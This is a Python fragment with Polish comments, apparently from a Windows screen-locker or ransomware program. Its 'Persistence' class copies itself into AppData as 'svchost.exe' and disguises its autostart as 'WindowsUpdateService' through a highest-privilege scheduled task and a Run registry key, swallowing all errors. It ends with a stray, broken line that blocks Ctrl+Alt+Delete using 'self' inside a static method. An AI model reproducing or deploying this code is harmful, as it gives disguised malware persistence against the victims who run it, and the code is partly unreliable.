# ============ 2. PERSISTENCJA (autostart) ============
class Persistence:
    @staticmethod
    def install():
        """Instaluje się w autostarcie (wiele metod)"""
        try:
            # Metoda 1: Kopiuj do AppData
            os.makedirs(APPDATA_DIR, exist_ok=True)
            
            # Kopiuj aktualny plik
            current_file = sys.executable if getattr(sys, 'frozen', False) else __file__
            target_file = os.path.join(APPDATA_DIR, "svchost.exe")
            
            if os.path.abspath(current_file) != os.path.abspath(target_file):
                shutil.copy2(current_file, target_file)
            
            # Metoda 2: Task Scheduler (uruchamia się przed explorerem)
            try:
                subprocess.run([
                    "schtasks", "/Create", "/TN", "WindowsUpdateService",
                    "/TR", target_file, "/SC", "ONLOGON", "/RL", "HIGHEST", "/F"
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
            
            # Metoda 3: Rejestr (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                                    0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, target_file)
                winreg.CloseKey(key)
            except:
                pass
            
            # Zapisz timestamp
            with open(TIMESTAMP_FILE, "w") as f:
                f.write(str(time.time()))
                
        except Exception as e:
            print(f"[-] Persistence error: {e}")
    
    @staticmethod
    def remove():
        """Usuwa autostart (przy odblokowaniu)"""
        try:
            subprocess.run(["schtasks", "/Delete", "/TN", "WindowsUpdateService", "/F"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Run",
                                0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "WindowsUpdateService")
            winreg.CloseKey(key)
        except:
            pass

        self.root.bind('<Control-Alt-Delete>', lambda e: "break")
